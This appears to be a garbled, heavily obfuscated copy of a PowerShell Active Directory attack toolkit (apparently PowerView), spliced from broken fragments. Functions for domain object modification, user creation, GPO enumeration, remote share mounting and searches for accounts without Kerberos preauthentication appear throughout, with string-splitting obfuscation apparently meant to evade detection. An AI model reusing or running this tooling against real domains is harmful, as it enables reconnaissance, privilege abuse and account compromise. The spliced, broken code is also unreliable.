        YoV{CrIJKEDIJKeIJKNtIAL} =   ( &(Z3b{1}{2}{0}Z3b -f S5zaRiABLES5z,S5zgS5z,S5zet-vS5z)  (S5zJS5z+S5zfiS5z)  ).Z3bvIJKAluEZ3b::Z3bEIJKmPTyZ3b
    )

    PROCESS {
        YoV{aIJKRIJKGUMEnIJKTs} = @{}
        if (YoV{PIJKsBIJKoUndIJKpaRaIJKmeTers}[(Z3b{1}{0}Z3b-f S5ztS5z,S5zForesS5z)]) { YoV{AIJKRgumIJKeNTs}[(Z3b{2}{0}{1}Z3b-f S5zoS5z,S5zrestS5z,S5zFS5z)] = YoV{FOReIJKST} }
        if (YoV{pIJKsIJKBIJKOUndpArAMeTErs}[(Z3b{1}{0}{2}Z3b -f S5zdentS5z,S5zCreS5z,S5zialS5z)]) { YoV{Ar','3b{1}{0}{2}Z3b-fS5zpS5z,S5zSearchScoS5z,S5zeS5z)] = YoV{sEARCHIJKscIJKoIJKPE} }
        if (YoV{PSBOUIJKNDpAIJKRIJKAMIJKeTEIJKRs}[(Z3b{2}{3}{1}{0}Z3b-f S5zzeS5z,S5zSiS5z,S5zResultPagS5z,S5zeS5z)]) { YoV{SEARIJKCHeRaIJKRIJKguMIJKeNts}[(Z3b{2}{3}{1}{0}Z3b -fS5zzeS5z,S5zeSiS5z,S5zResulS5z,S5ztPagS5z)] = YoV{rEsULIJKTPaIJKgIJKesIJKiZE} }
        if (YoV{pIJKSBoUNDpaIJKRameIJKTERS}[(Z3b{1}{2}{4}{0}{3}Z3b-fS5zTimS5z,S5zSerS5z,S5zvS5z,S5zeLimitS5z,S5zerS5z)]) { YoV{SeARcIJKHEIJKRIJKARIJKgIJKUmEntS}[(Z3b{1}{0}{2}Z3b-fS5zerTimeLiS5z,S5zServS5z,S5zmitS5z)] = YoV{sEIJKRIJKVErTIMElIJKimiT} }
        if (YoV{psIJKBoUIJKNdpaRIJKAmeIJKTErS}[(Z3b{0}{2}{1}Z3b-f S5zTomS5z,S5zstoneS5z,S5zbS5z)]) { YoV{SEaIJKRIJKCheRIJKArgIJKUmIJKEnts}[(Z3b{1}{0}{2}Z3b -fS5zombstoS5z,S5zTS5z,S5zneS5z)] = YoV{tOmbIJKstIJKOIJKNE} }
        if (YoV{pSBOUIJKNDIJKparIJKAmeteRs}[(Z3b{3}{1}{0}{2}Z3b-fS5ztiS5z,S5zedenS5z,S5zalS5z,S5zCrS5z)]) { YoV{SIJKeAIJKRcIJKHIJKeRIJKARgUMEnts}[(Z3b{0}{1}{2}Z3b -f S5zCrS5z,S5zedS5z,S5zentialS5z)] = YoV{cRIJKedeNIJKTIAL} }
    }

    PROCESS {
        if (YoV{PsIJKBIJKOUIJKNdPaRIJKAmeteIJKRs}[(Z3b{1}{2}{0}Z3b -f S5zentityS5z,S5zIS5z,S5zdS5z)]) { YoV{seaRIJKCHERIJKAIJKRGIJKUMEIJKNTs}[(Z3b{0}{2}{1}Z3b -f S5zIS5z,S5zyS5z,S5zdentitS5z)] = YoV{iIJKDEIJKNtiTY} }

        
        YoV{rAIJKwIJKObJeCt} = &(Z3b{2}{1}{0}{3}Z3b-f S5zmainS5z,S5zDoS5z,S5zGet-S5z,S5zObjectS5z) @SearcherArguments

        ForEach (YoV{oBJEIJKct} in YoV{rawOIJKBIJKJeCT}) {

            YoV{enIJKTry} = YoV{RAWoBIJKJEIJKCt}.(Z3b{0}{1}{3}{2}Z3b -f S5zGS5z,S5zetDiS5z,S5ztoryEntryS5z,S5zrecS5z).Invoke()

            if(YoV{PIJKsBoUIJKNdIJKParaIJKMetERs}[S5zSetS5z]) {
                try {
                    YoV{pIJKsIJKBIJKoUndpArIJKAIJKMETers}[S5zSetS5z].(Z3b{0}{1}{2}{3}Z3b -f S5zGS5z,S5zetES5z,S5znS5z,S5zumeratorS5z).Invoke() JGO &(Z3b{3}{1}{0}{2}Z3b -f S5zjecS5z,S5zbS5z,S5ztS5z,S5zForEach-OS5z) {
                        &(Z3b{0}{1}{2}Z3b-f S5zWritS5z,S5ze-VerbS5z,S5zoseS5z) Z3b[Set-DomainObject] Setting S5zYoV(YoV_.Name)S5z to S5zYoV(YoV_.Value)S5z for object S5zYoV(YoVRawObject.Properties.samaccountname)S5z Z3b
                        YoV{ENTIJKRY}.(Z3b{1}{0}Z3b -f S5ztS5z,S5zpuS5z).Invoke(YoV{_}.Z3bNAIJKMeZ3b, YoV{_}.Z3bVAlIJKUEZ3b)
                    }
                    YoV{eNIJKTrY}.(Z3b{3}{1}{2}{0}Z3b -f S5zsS5z,S5zaS5z,S5zngeS5z,S5zcommitchS5z).Invoke()
                }
                catch {
                    &(Z3b{1}{3}{0}{2}Z3b-fS5znS5z,S5zWrS5z,S5zgS5z,S5zite-WarniS5z) Z3b[Set-DomainObject] Error setting/replacing properties for object S5zYoV(YoVRawObject.Properties.samaccountname)S5z : YoV_ Z3b
                }
            }
','KLObIJK_sIJKizE} =  (&(Z3b{0}{1}Z3b -f S5zVArS5z,S5zIAbleS5z)  (Z3bAepSZ3b+Z3bIZ3b) -vALUeON)::Z3bTIJKOuiIJKNT32Z3b(YoV{BLobIJK_DIJKAta}[YoV{REsIJKERIJKVEd_bIJKLIJKoB_sIIJKZE_SIJKTart}..YoV{ReIJKsIJKeIJKRvEd_blob_size_EIJKNd}],0)

                        YoV{rEIJKSERVEIJKd_bloBIJK_StIJKArT} = YoV{REsEIJKRvIJKed_BLOb_SiIJKZe_IJKeND} + 1
                        YoV{REsIJKervED_IJKBLIJKOb_eIJKNd} = YoV{rESErVeIJKdIJK_BlOb_IJKStART} + YoV{RIJKESErVeD_BIJKlIJKoB_Size} - 1
                        YoV{RIJKEseIJKRVIJKEd_IJKBlOb} = YoV{BIJKlOb_daIJKTa}[YoV{reseRVEIJKDIJK_BLOBIJK_IJKSTaIJKRT}..YoV{rESERIJKVEIJKd_IJKBlOB_End}]
                        YoV{rIJKefeRral_ttIJKl_IJKStART} = YoV{ReSERveDIJK_bIJKlIJKOb_eND} + 1
                        YoV{REIJKFIJKerRAl_IJKTIJKTl_eND} = YoV{RefIJKEIJKRRaIJKLIJK_tTIJKl_STArt} + 3
                        YoV{ReIJKFErRAl_TIJKTL} =  ( &(Z3b{0}{3}{2}{1}Z3b-fS5zget-vaS5z,S5zeS5z,S5zABlS5z,S5zrIS5z) AepSi  -VAlUEOn  )::Z3btoIJKUiNTIJK32Z3b(YoV{BIJKLoB_IJKDaTA}[YoV{rIJKeIJKFeRIJKRAL_TtlIJK_START}..YoV{rEfeRIJKRaL_TtIJKlIJK_end}],0)

                        
                        YoV{tarGEtIJK_cIJKoUIJKNTIJK_StIJKArt} = 0
                        YoV{taIJKRGIJKEt_coIJKUNIJKTIJK_END} = YoV{TargEt_IJKcoIJKUNT_staIJKRt} + 3
                        YoV{TARIJKgeT_IJKCOunT} =   (  &(Z3b{0}{1}{2}Z3b-fS5zget-S5z,S5zvaS5z,S5zRiableS5z) (Z3bAepZ3b+Z3bSiZ3b)  -valueO)::Z3btoIJKUINIJKT32Z3b(YoV{dfs_TAIJKRgeIJKTLIsT_BIJKlob}[YoV{TarGETIJK_CoIJKUNt_IJKSTaIJKRt}..YoV{tIJKArGEt_COIJKUIJKNt_enD}],0)
                        YoV{TIJK_OffsIJKeT} = YoV{tarGIJKeTIJK_cOIJKUIJKNtIJK_EnD} + 1

                        for(YoV{J}=1; YoV{j} -le YoV{TaRIJKgEtIJK_cOIJKUNT}; YoV{J}++){
                            YoV{TArgIJKETIJK_IJKentIJKRY_siZeIJK_sTaRt} = YoV{T_IJKOIJKFFset}
                            YoV{tIJKArGEIJKT_eNtry_IJKSiIJKzeIJK_IJKeND} = YoV{tarIJKGIJKEIJKT_EntRIJKY_size_IJKStIJKARt} + 3
                            YoV{TIJKARGET_enIJKTRY_SIJKIZe} =   YoV{aeIJKPIJKsi}::Z3bTIJKOUIJKINT32Z3b(YoV{DfS_IJKTargEIJKTlIJKIsT_BLoB}[YoV{tAIJKRgIJKEtIJK_ENTrY_SIJKIzIJKeIJK_sTIJKArt}..YoV{TIJKArGeIJKT_ENTRY_IJKsIzIJKEIJ','Empty()]
        [Alias({Z3b{1}{0}Z3b -fS5zerS5z,S5zFiltS5z})]
        [String]
        YoV{ldapFIlIJKTIJKer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pRoIJKpIJKeRtIIJKES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-fS5zAS5z,S5zDSPathS5z})]
        [String]
        YoV{SIJKeaRIJKChIJKBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}{3}{4}Z3b -fS5zrS5z,S5zDomainCS5z,S5zontS5z,S5zolS5z,S5zlerS5z})]
        [String]
        YoV{sErIJKVEr},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zBS5z,S5zaseS5z}, {Z3b{1}{0}{2}Z3b-fS5zneLeveS5z,S5zOS5z,S5zlS5z}, {Z3b{1}{0}Z3b -fS5zbtreeS5z,S5zSuS5z})]
        [String]
        YoV{SEIJKArChSIJKcoIJKpe} = (Z3b{1}{0}{2}Z3b-fS5zrS5z,S5zSubtS5z,S5zeeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rESUIJKltPAIJKGesIJKizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SERvIJKErTIJKImELIIJKmIT},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zDaS5z,S5zclS5z}, {Z3b{1}{0}Z3b -f S5zupS5z,S5zGroS5z}, {Z3b{1}{0}Z3b -fS5zeS5z,S5zNonS5z}, {Z3b{1}{0}Z3b-f S5zwnerS5z,S5zOS5z}, {Z3b{1}{0}Z3b-fS5zlS5z,S5zSacS5z})]
        [String]
        YoV{SIJKecUIJKRIIJKTymIJKAskS},

        [Switch]
        YoV{tIJKOmIJKBIJKSTONe},

        [Alias({Z3b{0}{1}{3}{2}Z3b -f S5zReS5z,S5ztS5z,S5zneS5z,S5zurnOS5z})]
        [Switch]
        YoV{fiNdIJKOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKReDEIJKNTIAl} =   (&(Z3b{0}{1}{2}Z3b-fS5zvaS5z,S5zRiaBS5z,S5zlES5z)  Jfi -vaLu  )::Z3bEMIJKPtYZ3b,

        [Switch]
        YoV{rIJKAw}
    )

    BEGIN {
        YoV{sEAIJKRIJKchEIJKRaIJKRGUMIJKEnTS} = @{
            (Z3b{3}{1}{2}{0}Z3b -fS5zrefixS5z,S5zarchBasS5z,S5zePS5z,S5zSeS5z) = (Z3b{1}{3}{6}{0}{2','   if (YoV{gIJKpIJKoIJKgRoup}.Z3bGrIJKoUIJKPSIdZ3b -match YoV{tIJKAIJKRIJKgEtLocaLIJKSID}) {
                YoV{gIJKPIJKOgROup}.Z3bgRIJKOuIJKPmIJKeMbErsZ3b JGO &(Z3b','-f S5zPS5z,S5zrtiesS5z,S5zropeS5z))
                YoV{seaRCIJKHIJKeRIJKArIJKGUmeNTS}[(Z3b{0}{2}{1}{3}Z3b -fS5zLDS5z,S5ztS5z,S5zAPFilS5z,S5zerS5z)] = Z3b(objectclass=domain)(distinguishedname=YoVObjectDomainDN)Z3b
                YoV{gPIJKoaDSIJKPaIJKThs} += &(Z3b{5}{4}{0}{3}{1}{2}Z3b-f S5zt-DomS5z,S5zbjeS5z,S5zctS5z,S5zainOS5z,S5zeS5z,S5zGS5z) @SearcherArguments JGO &(Z3b{3}{0}{4}{2}{1}Z3b -f S5zEaS5z,S5zectS5z,S5zbjS5z,S5zForS5z,S5zch-OS5z) {
                    if(YoV{_}.Z3bGIJKpLInKZ3b) {
                        
                        YoV{_}.Z3bgIJKPIJKliNkZ3b.Z3bSIJKPLitZ3b(S5z][S5z) JGO &(Z3b{0}{2}{1}Z3b-fS5zForEach-ObS5z,S5zctS5z,S5zjeS5z) {
                            if (YoV{_}.(Z3b{1}{0}{2}Z3b -f S5ztS5z,S5zsS5z,S5zartswithS5z).Invoke((Z3b{1}{0}Z3b-fS5zDAPS5z,S5zLS5z))) {
                                YoV{_}.(Z3b{1}{0}Z3b-f S5zlitS5z,S5zspS5z).Invoke(S5z;S5z)[0]
                            }
                        }
                    }
                }
              ','}{18}Z3b-fS5zcoS5z,S5zberos S5z,S5zcS5z,S5zunS5z,S5zquS5z,S5z[GS5z,S5zts that do not S5z,S5znticatS5z,S5zpS5z,S5z user acS5z,S5zainUser] SearS5z,S5zet-DomS5z,S5zhiS5z,S5zire kerS5z,S5zrS5z,S5zrS5z,S5zeS5z,S5zng forS5z,S5zeS5z,S5zeautheS5z)
                YoV{FIJKILIJKTER} += ((Z3b{5}{1}{8}{4}{6}{3}{7}{0}{2}Z3b-f S5z803:=S5z,S5zouS5z,S5z4194304)S5z,S5z4S5z,S5z.2.840.113556S5z,S5z(userAccS5z,S5z.1.S5z,S5z.S5z,S5zntControl:1S5z))
            }
            if (YoV{pSboUNdpaIJKRIJKAmeIJKTErS}[(Z3b{2}{0}{1}Z3b -fS5zPFiltS5z,S5zerS5z,S5zLDAS5z)]) {
                &(Z3b{1}{3}{0}{2}Z3b -f S5zVerbosS5z,S5zWritS5z,S5zeS5z,S5ze-S5z) (S5z[GeS5z+S5zt-DomaiS5z+S5znUserS5z+S5z] S5z+S5zUsS5z+S5zing S5z+S5zaS5z+S5zdditionS5z+S5zal S5z+S5zLDAS5z+S5zP S5z+S5zfiS5z+S5zlter: S5z+Z3bYoVLDAPFilterZ3b)
                YoV{FiLIJKTIJKEr} += Z3bYoVLDAPFilterZ3b
            }

            
            YoV{UaCIJKFiIJKLTEr} JGO &(Z3b{0}{1}{2}Z3b -fS5zWheS5z,S5zre-S5z,S5zObjectS5z) {YoV{_}} JGO &(Z3b{1}{3}{2}{4}{0}Z3b-fS5ztS5z,S5zFS5z,S5zaS5z,S5zorES5z,S5zch-ObjecS5z) {
                if (YoV{_} -match (Z3b{2}{1}{0}Z3b-f S5z.*S5z,S5zOT_S5z,S5zNS5z)) {
                    YoV{UIJKACFieIJKlD} = YoV{_}.(Z3b{2}{0}{1}Z3b-f S5zinS5z,S5zgS5z,S5zSubstrS5z).Invoke(4)
                    YoV{UACvAIJKLIJKUe} = [Int](YoV{UAIJKcIJKenuM}::YoV{uaIJKCfiIJKElD})
                    YoV{FIlIJKTIJKeR} += Z3b(!(userAccountControl:1.2.840.113556.1.4.803:=YoVUACValue))Z3b
                }
                else {
                    YoV{uAcvAIJKlIJKUe} = [Int](YoV{uIJKAceIJKNUm}::YoV{_})
                    YoV{FILIJKTIJKer} += Z3b(userAccountControl:1.2.840.113556.1.4.803:=YoVUACValue)Z3b
                }
            }

            YoV{UIJKseIJKRsearcIJKher}.Z3bfIJKIltERZ3b = Z3b(&(samAccountType=805306368)YoVFilter)Z3b
            &(Z3b{2}{0}{3}{1}Z3b -f S5ziS5z,S5zVerboseS5z,S5zWrS5z,S5zte-S5z) Z3b[Get-DomainUser] filter string: YoV(YoVUserSearcher.filter) Z3b

            if (YoV{pIJKsIJKBOunDPAIJKRaMIJKEtERs}[(Z3b{1}{0}Z3b -fS5zOneS5z,S5zFindS5z)]) { YoV{RIJKEIJKSulTs} = YoV{uIJKseIJKRsEIJKARCHIJKER}.(Z3b{0}{1}Z3b -fS5zFindOnS5z,S5zeS5z).Invoke() }
            else { YoV{rEIJKsIJKULTS} = YoV{uSERIJKSEaIJKRChIJKER}.(Z3b{0}{1}{2}Z3b-fS5zFS5z,S5zindS5z,S5zAllS5z).Invoke() }
            YoV{rEIJKSulTS} JGO &(Z3b{0}{3}{1}{2}Z3b -fS5zWhS5z,S5zre-S5z,S5zObjectS5z,S5zeS5z) {YoV{_}} JGO &(Z3b{1}{0}{2}{3}Z3b-fS5zorEachS5z,S5zFS5z,S5z-S5z,S5zObjectS5z) {
                if (YoV{psIJKBIJKOUNDPArAIJKmIJKETIJKERS}[S5zRawS5z]) {
                    
                    YoV{usIJKer} = YoV{_}
                    YoV{uIJKSER}.Z3bpIJKSoBIJKJECTZ3b.Z3btypeIJKNAmIJKESZ3b.(Z3b{0}{1}{2}Z3b-fS5zIS5z,S5znsS5z,S5zertS5z).Invoke(0, (Z3b{4}{0}{1}{2}{3}Z3b-f S5zrS5z,S5zVieS5z,S5zw.UserS5z,S5z.RawS5z,S5zPoweS5z))
                }
                else {
                    YoV{uIJKSEr} = &(Z3b{3}{1}{2}{0}Z3b-f S5ztyS5z,S5zeS5z,S5zrS5z,S5zConvert-LDAPPropS5z) -Properties YoV{_}.Z3bpROIJKPeRtiIJKesZ3b
                    YoV{USIJKER}.Z3bpIJKSOBIJKJECtZ3b.Z3bTyPEnIJKAIJKmEsZ3b.(Z3b{0}{1}Z3b -f S5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{2}{3}{1}{0}Z3b-f S5zserS5z,S5zUS5z,S5zPowerViewS5z,S5z.S5z))
                }
                YoV{uIJKSEr}
            }
            if (YoV{reSuLIJKTs}) {
                try { YoV{RIJKESUIJKLts}.(Z3b{0}{2}{1}Z3b-f S5zdispoS5z,S5zeS5z,S5zsS5z).Invoke() }
                catch {
                    &(Z3b{1}{0}{3}{2}Z3b -f S5zritS5z,S5zWS5z,S5zboseS5z,S5ze-VerS5z) (S5z[GetS5z+S5z-DomainUS5z+S5zserS5z+S5z] S5z+S5zErS5z+S5zror S5z+S5zdisS5z+S5zposiS5z+S5zng S5z+S5zoS5z+S5zf S5z+S5ztS5z+S5zhe S5z+S5zReS5z+S5zsults S5z+S5zobjS5z+S5zecS5z+S5zt: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{uSerIJKSIJKEIJKAIJKRcHEr}.(Z3b{0}{1}{2}Z3b -f S5zdiS5z,S5zspS5z,S5zoseS5z).Invoke()
        }
    }
}


function nIJKEw-DIJKoMAInUIJKsIJKEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{7}{3}{6}{0}{4}{5}{2}{1}Z3b-f S5zessForS5z,S5zangingFunctionsS5z,S5zeChS5z,S5zdPrS5z,S5zSS5z,S5ztatS5z,S5zocS5z,S5zPSUseShoulS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{1}{2}{3}Z3b -f S5zPSShS5z,S5zouS5z,S5zldPS5z,S5zrocessS5z}, S5zS5z)]
    [OutputType({Z3b{0}{8}{1}{7}{2}{6}{12}{3}{4}{11}{10}{5}{9}Z3b-f S5zDS5z,S5zeS5z,S5zyServiS5z,S5zouS5z,S5zntS5z,S5zincipS5z,S5zceS5z,S5zctorS5z,S5zirS5z,S5zalS5z,S5zment.UserPrS5z,S5zManageS5z,S5zs.AccS5z})]
    Param(
        [Parameter(mandAtOrY = YoV{TIJKRUe})]
        [ValidateLength(0, 256)]
        [String]
        YoV{sIJKAmIJKACIJKCOuNTNAME},

        [Parameter(MaNdATorY = YoV{tIJKRUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -fS5zdS5z,S5zssworS5z,S5zPaS5z})]
        [Security.SecureString]
        YoV{aCcoUntpIJKASIJKsIJKWORD},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{nAIJKme},

        [ValidateNotNul','er},

        [Parameter(pAraMeTErsetnamE = Z3blIJKDapZ3b)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pIJKROpIJKERtIJKiES},

        [Parameter(pAraMETERSETNaME = Z3blIJKdAPZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -fS5zathS5z,S5zPS5z,S5zADSS5z})]
        [String]
        YoV{SIJKeIJKARcIJKhbAsE},

        [Parameter(pArAmetErSEtNaMe = Z3bLIJKDApZ3b)]
        [Parameter(PARAMeTERSETNAme = S5zAPIS5z)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{2}{3}{1}{0}Z3b -fS5zlerS5z,S5zlS5z,S5zainCS5z,S5zontroS5z,S5zDomS5z})]
        [String]
        YoV{seRIJKVER},

        [Parameter(PARameTERsetnAMe = Z3bLdIJKApZ3b)]
        [ValidateSet({Z3b{0}{1}Z3b-fS5zBasS5z,S5zeS5z}, {Z3b{0}{1}{2}Z3b-fS5zOS5z,S5znS5z,S5zeLevelS5z}, {Z3b{0}{1}Z3b-fS5zSuS5z,S5zbtreeS5z})]
        [String]
        YoV{SeARCHSIJKcIJKoIJKPE} = (Z3b{1}{0}Z3b-f S5zbtreeS5z,S5zSuS5z),

        [Parameter(paRametErSETnAme = Z3blIJKdApZ3b)]
        [ValidateRange(1, 10000)]
        [Int]
        YoV{RIJKeSULIJKTpAGeSIJ','5z: S5z+Z3bYoV_Z3b)
                }
            }

            
            &(Z3b{2}{0}{3}{1}Z3b -f S5zPropeS5z,S5ztyS5z,S5zSet-S5z,S5zrS5z) YoV{TIJKRaNsLaIJKTE} (Z3b{4}{2}{0}{3}{1}Z3b -fS5zfeS5z,S5zlS5z,S5zhaseReS5z,S5zrraS5z,S5zCS5z) (0x60)

            try {
                
                YoV{NUIJKll} = &(Z3b{2}{0}{3}{1}{4}Z3b-fS5zoke-S5z,S5zoS5z,S5zInvS5z,S5zMethS5z,S5zdS5z) YoV{trIJKANSlIJKATe} S5zSetS5z (8, YoV{tArgIJKeTIIJKdIJKEnTIty})
                &(Z3b{3}{2}{0}{1}Z3b -f S5ze-MS5z,S5zethodS5z,S5zvokS5z,S5zInS5z) YoV{TRIJKAIJKNSlATE} S5zGetS5z (YoV{aDsoIJKUtPIJKUttIJKYpe})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &(Z3b{3}{1}{2}{0}Z3b -fS5zeS5z,S5zbS5z,S5zosS5z,S5zWrite-VerS5z) Z3b[Convert-ADName] Error translating S5zYoVTargetIdentityS5z : YoV(YoV_.Exception.InnerException.Message) Z3b
            }
        }
    }
}


function CoIJKNvErIJKTFroMIJK-uIJKACvaLuE {


    [OutputType({Z3b{4}{10}','}{4}{3}{0}Z3b -fS5zredentialS5z,S5zGeS5z,S5ztNeS5z,S5zorkCS5z,S5ztwS5z).Invoke().Z3bpaIJKsIJKSwORDZ3b, YoV{crEdIJKEIJKNTiAL}.Z3bUSIJKeRnIJKAmEZ3b, 4)

            if (YoV{rEIJKsUlt} -eq 0) {
                &(Z3b{0}{1}{2}Z3b -fS5zWrite-VerS5z,S5zbosS5z,S5zeS5z) (Z3bYoVTargetPath Z3b+S5zsS5z+S5zuccesS5z+S5zsfS5z+S5zulS5z+S5zly S5z+S5zmouS5z+S5znteS5z+S5zdS5z)
            }
            else {
                Throw Z3b[Add-RemoteConnection] error mounting YoVTargetPath : YoV(([ComponentModel.Win32Exception]YoVResult).Message) Z3b
            }
        }
    }
}


function rIJKeMoVIJKe-reIJKMOTEIJKcOnnECTioN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{7}{6}{8}{4}{3}{1}{2}{5}{0}{9}Z3b-fS5znctiS5z,S5zChangiS5z,S5zngS5z,S5zeS5z,S5zForStatS5z,S5zFuS5z,S5zSUseShoS5z,S5zPS5z,S5zuldProcessS5z,S5zonsS5z}, S5zS5z)]
    [CmdletBinding(DefAuLTPARaMETeRSETnAmE = {Z3b{0}{3}{2}{1}Z3b -fS5zComputeS5z,S5zeS5z,S5zNamS5z,S5zrS5z})]
    Param(
        [Parameter(PositioN = 0, MaNDAtoRY = YoV{trIJKUe}, pARameTErSEtnaME = Z3bCoMpIJKUTeRNAIJKMEZ3b, vALUEfROMPIpEline = YoV{TrIJKUe}, vAlUEFROmpiPElIneBYprOPErtyNAmE = YoV{tIJKRUE})]
        [Alias({Z3b{1}{0}{2}Z3b -f S5ztNaS5z,S5zHosS5z,S5zmeS5z}, {Z3b{2}{1}{3}{0}Z3b-fS5zmeS5z,S5zostS5z,S5zdnshS5z,S5znaS5z}, {Z3b{1}{0}Z3b-f S5zeS5z,S5znamS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cOIJKmIJKpIJKUteIJKRnAme},

        [Parameter(PosiTioN = 0, PArAMEterSETNAMe = Z3bPIJKATHZ3b, MAnDAtORy = YoV{tIJKRue})]
        [ValidatePattern({((Z3b{1}{3}{5}{0}{2}{4}Z3b-f S5zwS5z,S5zVS5z,S5z.*ViS5z,S5ziwViwViS5z,S5zwViw.*S5z,S5zwViS5z)).Z3breplaIJKcEZ3b(([CHar]86+[CHar]105+[CHar]119),[StRING][CHar]92)})]
        [String[]]
        YoV{PaIJKTH}
    )

    PROCESS {
        YoV{paIJKTHS} = @()
        if (YoV{PsbouNIJKDpaRaIJKMIJKeIJKTErS}[(Z3b{2}{1}{0}{3}Z3b-fS5zterNS5z,S5zmpuS5z,S5zCoS5z,S5zameS5z)]) {
            ForEach (YoV{targeTcIJKoMIJKPuTIJKErNIJKAme} in YoV{cOmIJKPIJKUTERNIJKAMe}) {
                YoV{TArIJKgETcoMpUTEIJKRnIJKAMe} = YoV{tIJKAIJKRGEtIJKCOMPuIJKTIJKErnaME}.(Z3b{0}{1}Z3b-f S5zTriS5z,S5zmS5z).Invoke(S5z5rjS5z)
                YoV{pIJKATHS} += ,Z3b5rj5rjYoVTargetComputerName5rjIPCYoVZ3b
            }
        }
        else {
            YoV{PAIJKTHS} += ,YoV{PAIJKTh}
        }

        ForEach (YoV{','RGIJKUIJKMeNTs}[(Z3b{3}{0}{2}{1}{4}Z3b-fS5zulS5z,S5zgeSiS5z,S5ztPaS5z,S5zResS5z,S5zzeS5z)] = YoV{resUlTIJKPagIJKeSIzE} }
        if (YoV{PSboUNdIJKpAIJKRAIJKMEIJKTers}[(Z3b{1}{2}{0}{3}Z3b -fS5zeLS5z,S5zSeS5z,S5zrverTimS5z','MasS5z,S5zSS5z,S5zksS5z,S5zeS5z)]) {
            YoV{seaRIJKcIJKHER}.Z3bseCIJKUrIJKITyIJKMAsKsZ3b = Switch (YoV{SEcIJKUIJKRitYMIJKASKS}) {
                (Z3b{0}{1}Z3b -f S5zDaS5z,S5zclS5z) {  YoV{TIJKGk}::Z3bdaIJKclZ3b }
                (Z3b{1}{0}Z3b -fS5zoupS5z,S5zGrS5z) {   (  &(Z3b{1}{0}Z3b-fS5zIRS5z,S5zdS5z)  (Z3bVaZ3b+Z3bRiabZ3b+Z3bLE:tGkZ3b)  ).Z3bVAIJKLUeZ3b::Z3bGIJKROUpZ3b }
                (Z3b{0}{1}Z3b -fS5zNS5z,S5zoneS5z) {  ( &(Z3b{0}{1}{2}Z3b-f S5zvARS5z,S5ziaS5z,S5zBleS5z) (S5zTS5z+S5zGkS5z)  -vALUEO)::Z3bNoIJKNeZ3b }
                (Z3b{1}{0}Z3b -f S5zrS5z,S5zOwneS5z) {  YoV{tIJKGK}::Z3bowIJKNErZ3b }
                (Z3b{1}{0}Z3b-fS5zaclS5z,S5zSS5z) {  (  &(Z3b{0}{2}{1}Z3b-f S5zgS5z,S5zleS5z,S5zeT-VARIAbS5z) (Z3bTZ3b+Z3bGkZ3b)).Z3bvaLIJKUEZ3b::Z3bSAIJKcLZ3b }
            }
        }

        if (YoV{psbOUNIJKDIJKPaRIJKAmE','if (YoV{idENIJKTIJKIIJKTYiIJKNStAnCE} -imatch S5z^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}YoVS5z) {
                        YoV{GuidBYIJKTIJKEIJKsIJKTRING} = (([Guid]YoV{IDIJKentiTyiIJKNSTaIJKNCe}','IJKOmIJKAIn} }
        if (YoV{PsIJKBOundIJKPArIJKAmETeRS}[(Z3b{1}{2}{0}Z3b -f S5zertiesS5z,S5zPS5z,S5zropS5z)]) { YoV{seaRCHeIJKRaIJKRGIJKUmeIJKNTS}[(Z3b{2}{0}{1}Z3b-f S5zropertiS5z,S5zesS5z,S5zPS5z)] = YoV{PropEIJKRIJKTies} }
        if (YoV{psIJKBOUndPaIJKRametEIJKRs}[(Z3b{0}{1}{2}Z3b-f S5zSeS5z,S5zaS5z,S5zrchBaseS5z)]) { YoV{sIJKEAIJKRIJKCHerIJKARGUMeIJKNtS}[(Z3b{1}{0}{2}Z3b-f S5zchBS5z,S5zSearS5z,S5zaseS5z)] = YoV{SeaIJKRcIJKhbAIJKsE} }
        if (YoV{PSIJKBOIJKUndIJKPAraMetIJKeRs}[(Z3b{0}{1}Z3b -fS5zSerS5z,S5zverS5z)]) { YoV{SeArCHIJKerARIJKgIJKUIJKmEIJKNtS}[(Z3b{1}{0}Z3b -f S5zrverS5z,S5zSeS5z)] = YoV{SIJKerVeR} }
        if (YoV{pIJKSbOUNdPIJKAIJKRAMetErs}[(Z3b{1}{3}{2}{0}Z3b -f S5zopeS5z,S5zSeS5z,S5zcS5z,S5zarchSS5z)]) { YoV{SEIJKArCherIJKARGUIJKmENtS}[(Z3b{1}{2}{0}Z3b-f S5zcopeS5z,S5zSearcS5z,S5zhSS5z)] = YoV{sIJKeARChscoIJKpE} }
